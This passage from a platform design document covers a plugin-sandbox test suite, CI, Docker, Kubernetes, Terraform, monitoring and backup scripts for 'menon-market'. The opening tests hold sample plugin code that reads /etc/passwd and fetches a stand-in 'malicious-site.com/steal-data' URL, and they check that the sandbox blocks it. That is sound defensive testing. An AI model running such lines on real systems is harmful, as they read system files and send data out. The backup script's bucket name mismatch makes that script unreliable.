describe('Plugin Security Sandbox', () => {
  it('should prevent file system access outside allowed paths', async () => {
    const maliciousPlugin = createMaliciousPlugin({
      code: `
        const fs = require('fs');
        fs.readFileSync('/etc/passwd', 'utf8');
      `
    });

    const result = await executePluginInSandbox(maliciousPlugin);

    expect(result.success).toBe(false);
    expect(result.error).toContain('Permission denied');
  });

  it('should restrict network access to allowed domains', async () => {
    const networkPlugin = createNetworkPlugin({
      code: `
        fetch('http://malicious-site.com/steal-data');
      `
    });

    const result = await executePluginInSandbox(networkPlugin);

    expect(result.success).toBe(false);
    expect(result.error).toContain('Network access denied');
  });
});
```

### Test Coverage Requirements

**Coverage Targets**:
- **Unit Tests**: 90% line coverage, 85% branch coverage
- **Integration Tests**: 80% line coverage for API endpoints
- **E2E Tests**: 100% coverage of critical user paths
- **Security Tests**: 100% coverage of security-sensitive functions

**Coverage Configuration**:
```json
{
  "jest": {
    "collectCoverageFrom": [
      "src/**/*.{ts,tsx}",
      "!src/**/*.d.ts",
      "!src/**/*.stories.{ts,tsx}",
      "!src/**/__tests__/**"
    ],
    "coverageThreshold": {
      "global": {
        "branches": 85,
        "functions": 90,
        "lines": 90,
        "statements": 90
      }
    }
  }
}
```

### Continuous Integration Testing

**GitHub Actions Workflow**:
```yaml
# .github/workflows/test.yml
name: Test Suite
on: [push, pull_request]

jobs:
  test:
    runs-on: ubuntu-latest

    services:
      mongodb:
        image: mongo:7.0
        ports:
          - 27017:27017
      redis:
        image: redis:7.2
        ports:
          - 6379:6379

    steps:
      - uses: actions/checkout@v3

      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '20.6.0'

      - name: Setup Bun
        uses: oven-sh/setup-bun@v1

      - name: Install dependencies
        run: bun install

      - name: Run linting
        run: bun run lint

      - name: Run type checking
        run: bun run type-check

      - name: Run unit tests
        run: bun run test:unit --coverage

      - name: Run integration tests
        run: bun run test:integration

      - name: Upload coverage
        uses: codecov/codecov-action@v3

      - name: Run E2E tests
        run: bun run test:e2e
```

### Testing Environment Management

**Test Database Strategy**:
- **Unit Tests**: In-memory mocks
- **Integration Tests**: Docker MongoDB with isolated databases
- **E2E Tests**: Dedicated test database with cleanup between tests

**Test Data Management**:
- **Fixtures**: Factories for consistent test data generation
- **Seeding**: Automated test database seeding
- **Cleanup**: Automatic test data cleanup after each test
- **Isolation**: Each test runs in isolated environment

This comprehensive testing approach ensures the reliability, security, and performance of the menon-market platform while maintaining high development velocity through automated testing pipelines.

---

## Deployment Strategy

### Deployment Architecture Overview

Menon-market employs a **multi-environment deployment strategy** with comprehensive infrastructure as code (IaC) practices. The platform is designed for high availability, scalability, and security with automated CI/CD pipelines and progressive deployment strategies.

### Environment Strategy

**Environment Hierarchy**:
1. **Development** (`dev`) - Local development with hot reload
2. **Integration** (`int`) - Feature testing and integration validation
3. **Staging** (`staging`) - Production-like environment for final validation
4. **Production** (`prod`) - Live environment with blue-green deployment

**Environment Configuration**:
```yaml
# deployment/environments/dev.yml
environment: development
replicas: 1
resources:
  api:
    cpu: "500m"
    memory: "1Gi"
  ui:
    cpu: "250m"
    memory: "512Mi"
database:
  type: mongodb
  size: "small"
  backup: false

# deployment/environments/staging.yml
environment: staging
replicas: 2
resources:
  api:
    cpu: "1000m"
    memory: "2Gi"
  ui:
    cpu: "500m"
    memory: "1Gi"
database:
  type: mongodb
  size: "medium"
  backup: true
  retention: "7d"

# deployment/environments/prod.yml
environment: production
replicas: 3
resources:
  api:
    cpu: "2000m"
    memory: "4Gi"
  ui:
    cpu: "1000m"
    memory: "2Gi"
database:
  type: mongodb
  size: "large"
  backup: true
  retention: "30d"
```

### Container Strategy

**Multi-Stage Docker Builds**:
```dockerfile
# packages/api-server/Dockerfile
FROM node:20.6.0-alpine AS base
WORKDIR /app
COPY package*.json ./
COPY bun.lockb ./

FROM base AS deps
RUN bun install --frozen-lockfile --production

FROM base AS builder
COPY . .
RUN bun install --frozen-lockfile
RUN bun run build

FROM base AS runner
RUN addgroup --system --gid 1001 nodejs
RUN adduser --system --uid 1001 nodejs
COPY --from=deps /app/node_modules ./node_modules
COPY --from=builder --chown=nodejs:nodejs /app/dist ./dist

USER nodejs
EXPOSE 3001
CMD ["node", "dist/index.js"]
```

**Kubernetes Deployment Configuration**:
```yaml
# deployment/kubernetes/api-deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: menon-market-api
  labels:
    app: menon-market-api
spec:
  replicas: 3
  selector:
    matchLabels:
      app: menon-market-api
  template:
    metadata:
      labels:
        app: menon-market-api
    spec:
      containers:
      - name: api
        image: menon-market/api:latest
        ports:
        - containerPort: 3001
        env:
        - name: NODE_ENV
          value: "production"
        - name: MONGODB_URI
          valueFrom:
            secretKeyRef:
              name: menon-market-secrets
              key: mongodb-uri
        - name: REDIS_URL
          valueFrom:
            secretKeyRef:
              name: menon-market-secrets
              key: redis-url
        resources:
          requests:
            memory: "2Gi"
            cpu: "1000m"
          limits:
            memory: "4Gi"
            cpu: "2000m"
        livenessProbe:
          httpGet:
            path: /health
            port: 3001
          initialDelaySeconds: 30
          periodSeconds: 10
        readinessProbe:
          httpGet:
            path: /ready
            port: 3001
          initialDelaySeconds: 5
          periodSeconds: 5
---
apiVersion: v1
kind: Service
metadata:
  name: menon-market-api-service
spec:
  selector:
    app: menon-market-api
  ports:
  - protocol: TCP
    port: 80
    targetPort: 3001
  type: ClusterIP
```

### Infrastructure as Code (Terraform)

**AWS Infrastructure Setup**:
```hcl
# deployment/terraform/main.tf
terraform {
  required_version = ">= 1.5.5"
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 5.17.0"
    }
    kubernetes = {
      source  = "hashicorp/kubernetes"
      version = "~> 2.23.0"
    }
  }
}

provider "aws" {
  region = var.aws_region
}

# EKS Cluster
resource "aws_eks_cluster" "menon_market" {
  name     = "menon-market-cluster"
  role_arn = aws_iam_role.eks_cluster.arn
  version  = "1.28"

  vpc_config {
    subnet_ids = aws_subnet.private[*].id
  }

  depends_on = [
    aws_iam_role_policy_attachment.eks_cluster_policy,
  ]
}

# MongoDB Atlas Integration
resource "mongodbatlas_cluster" "menon_market" {
  project_id   = var.atlas_project_id
  name         = "menon-market-prod"
  provider_name = "AWS"

  provider_region_name = "US_EAST_1"
  provider_instance_type_name = "M30"

  cluster_type = "REPLICASET"
  replication_specs {
    num_shards = 1
    regions_config {
      US_EAST_1 {
        electable_specs {
          instance_size = "M30"
          node_count   = 3
        }
        priority     = 7
        provider_name = "AWS"
      }
    }
  }

  backup_enabled = true
  auto_scaling_disk_gb_enabled = true
}

# Redis Cluster
resource "aws_elasticache_subnet_group" "menon_market" {
  name       = "menon-market-cache-subnet"
  subnet_ids = aws_subnet.private[*].id
}

resource "aws_elasticache_replication_group" "menon_market" {
  replication_group_id       = "menon-market-redis"
  description                = "Redis cluster for menon-market"
  node_type                  = "cache.r6g.large"
  port                       = 6379
  parameter_group_name       = "default.redis7"
  subnet_group_name          = aws_elasticache_subnet_group.menon_market.name
  automatic_failover_enabled = true
  num_cache_clusters         = 3

  at_rest_encryption_enabled = true
  transit_encryption_enabled = true
  auth_token                 = var.redis_auth_token
}

# Application Load Balancer
resource "aws_lb" "menon_market" {
  name               = "menon-market-alb"
  internal           = false
  load_balancer_type = "application"
  security_groups    = [aws_security_group.alb.id]
  subnets            = aws_subnet.public[*].id

  enable_deletion_protection = false
}

resource "aws_lb_listener" "menon_market" {
  load_balancer_arn = aws_lb.menon_market.arn
  port              = "443"
  protocol          = "HTTPS"
  ssl_policy        = "ELBSecurityPolicy-TLS-1-2-2017-01"
  certificate_arn   = aws_acm_certificate.menon_market.arn

  default_action {
    type             = "forward"
    target_group_arn = aws_lb_target_group.ui.arn
  }
}
```

### CI/CD Pipeline (GitHub Actions)

**Complete Deployment Pipeline**:
```yaml
# .github/workflows/deploy.yml
name: Deploy to Production

on:
  push:
    branches: [main]
  workflow_dispatch:

env:
  REGISTRY: ghcr.io
  IMAGE_NAME: menon-market

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Setup Bun
        uses: oven-sh/setup-bun@v1

      - name: Install dependencies
        run: bun install --frozen-lockfile

      - name: Run tests
        run: bun run test:coverage

      - name: Upload coverage
        uses: codecov/codecov-action@v3

  build:
    needs: test
    runs-on: ubuntu-latest
    outputs:
      image-digest: ${{ steps.build.outputs.digest }}
      image-tag: ${{ steps.meta.outputs.tags }}

    steps:
      - uses: actions/checkout@v4

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v3

      - name: Log in to Container Registry
        uses: docker/login-action@v3
        with:
          registry: ${{ env.REGISTRY }}
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Extract metadata
        id: meta
        uses: docker/metadata-action@v5
        with:
          images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}
          tags: |
            type=ref,event=branch
            type=ref,event=pr
            type=sha,prefix={{branch}}-
            type=raw,value=latest,enable={{is_default_branch}}

      - name: Build and push API image
        id: build
        uses: docker/build-push-action@v5
        with:
          context: ./packages/api-server
          push: true
          tags: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}/api:${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}
          cache-from: type=gha
          cache-to: type=gha,mode=max

      - name: Build and push UI image
        uses: docker/build-push-action@v5
        with:
          context: ./packages/marketplace-ui
          push: true
          tags: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}/ui:${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}
          cache-from: type=gha
          cache-to: type=gha,mode=max

  deploy-staging:
    needs: build
    runs-on: ubuntu-latest
    environment: staging

    steps:
      - uses: actions/checkout@v4

      - name: Setup Terraform
        uses: hashicorp/setup-terraform@v3
        with:
          terraform_version: "1.5.5"

      - name: Terraform Plan
        id: plan
        run: |
          cd deployment/terraform
          terraform init -backend-config=backend-staging.hcl
          terraform plan -var-file=staging.tfvars -out=tfplan
        env:
          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}

      - name: Terraform Apply
        run: |
          cd deployment/terraform
          terraform apply -auto-approve tfplan
        env:
          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}

      - name: Update Kubernetes manifests
        run: |
          sed -i "s|IMAGE_TAG|${{ needs.build.outputs.image-tag }}|g" deployment/kubernetes/*.yaml

      - name: Deploy to staging
        run: |
          kubectl apply -f deployment/kubernetes/ -n menon-market-staging
          kubectl rollout status deployment/menon-market-api -n menon-market-staging

  integration-tests:
    needs: deploy-staging
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v4

      - name: Run integration tests against staging
        run: |
          bun run test:integration:staging
        env:
          STAGING_URL: https://staging.menon-market.com

  deploy-production:
    needs: [build, integration-tests]
    runs-on: ubuntu-latest
    environment: production

    steps:
      - uses: actions/checkout@v4

      - name: Blue-Green Deployment
        run: |
          # Deploy to green environment
          kubectl apply -f deployment/kubernetes/ -n menon-market-green

          # Wait for green to be ready
          kubectl rollout status deployment/menon-market-api -n menon-market-green

          # Switch traffic to green
          kubectl patch service menon-market-api-prod -p '{"spec":{"selector":{"version":"green"}}}'

          # Wait for verification period
          sleep 300

          # Clean up blue environment
          kubectl delete -f deployment/kubernetes/ -n menon-market-blue --ignore-not-found

  post-deployment:
    needs: deploy-production
    runs-on: ubuntu-latest

    steps:
      - name: Health checks
        run: |
          curl -f https://api.menon-market.com/health || exit 1
          curl -f https://menon-market.com || exit 1

      - name: Run smoke tests
        run: bun run test:smoke:production

      - name: Update deployment status
        run: |
          curl -X POST "${{ github.api_url }}/repos/${{ github.repository }}/deployments" \
            -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
            -H "Accept: application/vnd.github.v3+json" \
            -d '{"ref":"${{ github.sha }}","environment":"production","description":"Deployment completed successfully"}'
```

### Monitoring and Observability

**Prometheus and Grafana Setup**:
```yaml
# deployment/monitoring/prometheus.yml
global:
  scrape_interval: 15s
  evaluation_interval: 15s

scrape_configs:
  - job_name: 'menon-market-api'
    kubernetes_sd_configs:
    - role: endpoints
      namespaces:
        names:
        - menon-market-prod
    relabel_configs:
    - source_labels: [__meta_kubernetes_service_name]
      action: keep
      regex: menon-market-api-service

  - job_name: 'menon-market-ui'
    kubernetes_sd_configs:
    - role: endpoints
      namespaces:
        names:
        - menon-market-prod
    relabel_configs:
    - source_labels: [__meta_kubernetes_service_name]
      action: keep
      regex: menon-market-ui-service

rule_files:
  - "alert_rules.yml"

alerting:
  alertmanagers:
    - static_configs:
        - targets:
          - alertmanager:9093
```

**Alert Rules**:
```yaml
# deployment/monitoring/alert_rules.yml
groups:
- name: menon-market
  rules:
  - alert: HighErrorRate
    expr: rate(http_requests_total{status=~"5.."}[5m]) > 0.1
    for: 2m
    labels:
      severity: critical
    annotations:
      summary: High error rate detected
      description: "Error rate is {{ $value }} errors per second"

  - alert: HighResponseTime
    expr: histogram_quantile(0.95, rate(http_request_duration_seconds_bucket[5m])) > 2
    for: 5m
    labels:
      severity: warning
    annotations:
      summary: High response time detected
      description: "95th percentile response time is {{ $value }} seconds"

  - alert: DatabaseConnectionFailure
    expr: up{job="mongodb"} == 0
    for: 1m
    labels:
      severity: critical
    annotations:
      summary: Database connection failure
      description: "MongoDB is down"

  - alert: RedisConnectionFailure
    expr: up{job="redis"} == 0
    for: 1m
    labels:
      severity: critical
    annotations:
      summary: Redis connection failure
      description: "Redis is down"
```

### Backup and Disaster Recovery

**Database Backup Strategy**:
```bash
#!/bin/bash
# scripts/backup-database.sh

# MongoDB Backup
mongodump --uri="$MONGODB_URI" --out="/backup/mongodb/$(date +%Y%m%d_%H%M%S)"

# Redis Backup
redis-cli --rdb "/backup/redis/$(date +%Y%m%d_%H%M%S).rdb"

# Upload to S3
aws s3 sync /backup/ s3://menon-market-backups/$(date +%Y%m%d)/

# Cleanup old backups (keep 30 days)
aws s3 ls s3://menon-market-backups/ | while read -r line; do
  createDate=$(echo "$line" | awk '{print $1" "$2}')
  createDate=$(date -d "$createDate" +%s)
  olderThan=$(date -d "30 days ago" +%s)

  if [[ $createDate -lt $olderThan ]]; then
    fileName=$(echo "$line" | awk '{print $4}')
    if [[ $fileName != "" ]]; then
      aws s3 rm "s3://menon-market-backs/$fileName"
    fi
  fi
done
```

### Security and Compliance

**Security Hardening**:
- **Network Policies**: Kubernetes network policies for pod-to-pod communication
- **Pod Security Policies**: Restricted pod security standards
- **Secrets Management**: AWS Secrets Manager for sensitive data
- **SSL/TLS**: Force HTTPS with modern TLS configuration
- **WAF**: AWS WAF for application-level protection
- **VPC**: Isolated VPC with private subnets for application components

**Compliance Checks**:
```yaml
# deployment/security/compliance-checks.yml
apiVersion: v1
kind: ConfigMap
metadata:
  name: compliance-checks
data:
  check-pod-security.yaml: |
    apiVersion: policy/v1beta1
    kind: PodSecurityPolicy
    metadata:
      name: restricted
    spec:
      privileged: false
      allowPrivilegeEscalation: false
      requiredDropCapabilities:
        - ALL
      volumes:
        - 'configMap'
        - 'emptyDir'
        - 'projected'
        - 'secret'
        - 'downwardAPI'
        - 'persistentVolumeClaim'
      runAsUser:
        rule: 'MustRunAsNonRoot'
      seLinux:
        rule: 'RunAsAny'
      fsGroup:
        rule: 'RunAsAny'
```

This comprehensive deployment strategy ensures reliable, secure, and scalable delivery of the menon-market platform with proper monitoring, backup, and disaster recovery capabilities.